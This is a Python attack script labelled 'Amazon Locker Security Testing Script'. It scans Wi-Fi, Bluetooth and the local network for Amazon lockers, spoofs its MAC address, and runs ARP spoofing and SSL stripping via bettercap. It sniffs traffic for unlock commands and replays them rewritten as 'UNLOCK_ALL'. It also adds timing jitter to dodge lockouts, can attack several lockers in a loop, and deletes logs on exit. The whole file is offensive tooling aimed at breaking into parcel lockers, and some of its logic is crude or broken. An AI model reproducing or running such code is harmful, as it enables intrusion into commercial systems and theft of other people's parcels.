import os
import time
import random
import netifaces
import bluetooth
import signal
import hashlib
from scapy.all import ARP, Ether, srp, sniff, IP, Raw, send
from cryptography.fernet import Fernet

# Global variables
active_processes = []
captured_unlock_requests = []

# Generate encryption key for sensitive data (if needed)
encryption_key = Fernet.generate_key()
cipher = Fernet(encryption_key)

# Function to spoof MAC address
def spoof_mac(interface):
    new_mac = "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(5))
    os.system(f"ifconfig {interface} down")
    os.system(f"ifconfig {interface} hw ether {new_mac}")
    os.system(f"ifconfig {interface} up")
    print(f"[+] MAC address changed to {new_mac}")

# Function to slow down scanning
def slow_scan_wifi():
    print("[+] Scanning for Wi-Fi networks (Stealth Mode)...")
    wifi_networks = os.popen("nmcli -t -f SSID dev wifi").read().split("\n")
    locker_networks = [net for net in wifi_networks if "AmazonLocker" in net]
    time.sleep(random.uniform(3, 7))
    return locker_networks

def slow_scan_bluetooth():
    print("[+] Scanning for Bluetooth devices (Stealth Mode)...")
    nearby_devices = bluetooth.discover_devices(duration=8, lookup_names=True, flush_cache=True)
    locker_bluetooth = [dev[0] for dev in nearby_devices if "AmazonLocker" in dev[1]]
    time.sleep(random.uniform(3, 7))
    return locker_bluetooth

def slow_scan_local_network():
    print("[+] Scanning local network for Amazon lockers...")
    interface = netifaces.gateways()['default'][netifaces.AF_INET][1]
    subnet = ".".join(netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr'].split('.')[:3]) + ".0/24"

    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet), timeout=2, verbose=False)
    locker_ips = [rcv.psrc for snd, rcv in ans if "amazon" in os.popen(f"nslookup {rcv.psrc}").read().lower()]
    
    time.sleep(random.uniform(3, 7))
    return locker_ips

# Mobile Hotspot Mode (forces locker to connect to an attacker-controlled network)
def start_hotspot():
    print("[+] Enabling attacker-controlled mobile hotspot...")
    os.system("nmcli device wifi hotspot ssid AmazonLockerHack password FakePassword123")
    time.sleep(5)
    print("[+] Hotspot active. Waiting for lockers to connect...")

# ARP Spoofing
def start_arp_spoof(target_ip, gateway_ip, interface):
    print(f"[+] Starting ARP Spoofing on {target_ip} via {gateway_ip}")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    process = os.popen(f"bettercap -iface {interface} -eval 'set arp.spoof.targets {target_ip}; arp.spoof on'")
    active_processes.append(process)

# Packet Sniffer - Learns Unlock Requests (Smart Unlock)
def packet_sniffer(pkt):
    if pkt.haslayer(IP) and pkt.haslayer(Raw):
        data = pkt[Raw].load.decode(errors="ignore")
        packet_hash = hashlib.sha256(data.encode()).hexdigest()
        print(f"[+] Packet Hash: {packet_hash}")

        encrypted_data = cipher.encrypt(data.encode())

        if "unlock" in data.lower() or "open" in data.lower():
            print("[+] Detected unlock command pattern!")
            captured_unlock_requests.append(data)
            send_malicious_request(pkt[IP].dst, data)

# Selective SSL Strip
def start_ssl_strip(interface):
    print("[+] Starting selective SSL Strip...")
    process = os.popen(f"bettercap -iface {interface} -eval 'set http.proxy.sslstrip true; http.proxy on'")
    active_processes.append(process)

# Bypass Lockout Mechanism - Randomise time intervals
def bypass_lockout():
    print("[+] Adjusting attack speed to avoid lockout mechanisms...")
    time.sleep(random.uniform(2, 5))

# Send Smart Unlock Request
def send_malicious_request(target_ip, captured_command=None):
    print("[+] Attempting command injection...")

    if captured_command:
        modified_command = captured_command.replace("unlock", "UNLOCK_ALL")
    else:
        modified_command = "UNLOCK_ALL"

    print(f"[+] Sending crafted unlock request: {modified_command}")
    send(IP(dst=target_ip)/Raw(load=modified_command), verbose=0)
    bypass_lockout()

# Auto-Retry Mechanism
def auto_retry(target_ip):
    print("[+] Retrying attack using different methods...")
    time.sleep(random.uniform(3, 7))
    send_malicious_request(target_ip)

# Cleanup function
def cleanup(*args):
    print("\n[!] Stopping all attacks and restoring settings...")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    for process in active_processes:
        process.close()
    os.system("rm -f captured_data.txt")
    print("[+] Logs cleared.")
    exit(0)

# Multi-Locker Attack Mode
def multi_locker_attack(locker_list):
    print("[+] Attacking multiple lockers at once...")
    for locker in locker_list:
        mitm_attack(locker)

# Locker Detection Module
def locker_detection():
    print("[+] Starting Amazon Locker Detection...")

    wifi_results = slow_scan_wifi()
    if wifi_results:
        print("[+] Amazon Lockers detected via Wi-Fi:", wifi_results)
        return wifi_results
    
    bluetooth_results = slow_scan_bluetooth()
    if bluetooth_results:
        print("[+] Amazon Lockers detected via Bluetooth:", bluetooth_results)
        return bluetooth_results
    
    network_results = slow_scan_local_network()
    if network_results:
        print("[+] Amazon Lockers detected on Local Network:", network_results)
        return network_results

    print("[-] No Amazon lockers detected. Try again closer to a location.")
    return None

# MitM Attack Module
def mitm_attack(target_ip):
    interface = netifaces.gateways()['default'][netifaces.AF_INET][1]
    gateway_ip = netifaces.gateways()['default'][netifaces.AF_INET][0]

    print("[+] Spoofing MAC address...")
    spoof_mac(interface)

    print("[+] Starting MitM Attack on", target_ip)
    start_arp_spoof(target_ip, gateway_ip, interface)
    time.sleep(random.uniform(5, 10))

    print("[+] Capturing packets and looking for unlock patterns...")
    sniff(filter=f"host {target_ip}", prn=packet_sniffer, store=False, count=50)

    print("[+] Attempting SSL Stripping...")
    start_ssl_strip(interface)

    print("[+] Attack Complete. Checking if retry needed...")
    auto_retry(target_ip)

# Main Menu
def main():
    signal.signal(signal.SIGINT, cleanup)

    while True:
        print("\n==== Amazon Locker Security Testing Script ====")
        print("1. Detect and Attack Nearby Locker")
        print("2. Attack All Detected Lockers")
        print("3. Enable Mobile Hotspot Mode")
        print("4. Exit")

        choice = input("Select an option: ")

        if choice == "1":
            target_locker = locker_detection()
            if target_locker:
                mitm_attack(target_locker[0])
        elif choice == "2":
            all_lockers = locker_detection()
            if all_lockers:
                multi_locker_attack(all_lockers)
        elif choice == "3":
            start_hotspot()
        elif choice == "4":
            cleanup()
        else:
            print("Invalid option. Please try again.")

if __name__ == "__main__":
    main()
